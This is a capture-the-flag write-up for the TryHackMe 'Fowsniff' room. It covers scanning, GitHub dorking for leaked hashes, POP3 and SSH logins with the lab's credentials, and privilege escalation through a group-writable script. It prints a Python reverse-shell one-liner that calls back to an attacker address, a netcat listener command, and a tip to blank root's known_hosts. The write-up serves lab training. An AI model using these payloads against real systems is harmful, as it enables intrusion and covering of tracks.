Fowsniff — Day_1 (TryHackMe)

Enumeration → OSINT → POP3 → SSH → Reverse shell · by Svfear
Summary: Found leaked hashes via GitHub dorking, cracked them to build user/pass lists, authenticated to POP3, retrieved an email containing a temporary SSH password, SSH’d to a user account, and used a writable group-owned script to inject a reverse shell. This post documents the workflow and key commands.

Nmap

Command:

nmap -sV -sS -sC 10.10.147.226 -oN nmap.txt

Open ports discovered: 22, 80, 110, 143.

Web & OSINT

Checked target site, noticed possible breach indicators, then used Google/GitHub dorking to find leaked user:hash entries.

Search example:

site:"github.com" "fowsniff"

Collected username:hash lines and prepared them for cracking.

Cracking

Cracked hashes and created users.txt and passwords.txt for authentication trials.

POP3 — Retrieve emails

Used Metasploit and manual POP3 checks to validate credentials. Found working account (hidden by default).

seina : scoobydoo2

Manual interaction example:

nc 10.10.147.226 110
USER seina
PASS scoobydoo2
LIST
RETR 1
RETR 2

Email 1 contained a temporary SSH password. Example (hidden):

S1ck3nBluff+secureshell

SSH — Access

ssh seina@10.10.147.226
id
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)

User gained — continued enumeration for escalation.

Enumeration — Writable script

Searched for files owned by users group and found a writable script:

find / -group users -type f 2>/dev/null
/opt/cube/cube.sh
cat /opt/cube/cube.sh

The script was group-writable — inject a reverse shell payload and trigger it (ensure listener is ready).

Injected payload (replace YOUR_IP and port):

#!/bin/bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Tips before exiting SSH:

# on attacker:
nc -lvnp 1234
# optionally clear known_hosts on target if needed:
echo "" > /root/.ssh/known_hosts

Reverse shell hit — box completed for Day_1 🎉

Notes & References

  • Redact or hide credentials publicly; use reveal buttons or private notes for real passwords.
  • OSINT + GitHub dorking can reveal leaked data — use ethically and only in lab/CTF targets.
  • Check group and file permissions early — writable scripts or cron jobs are high-risk escalation vectors.
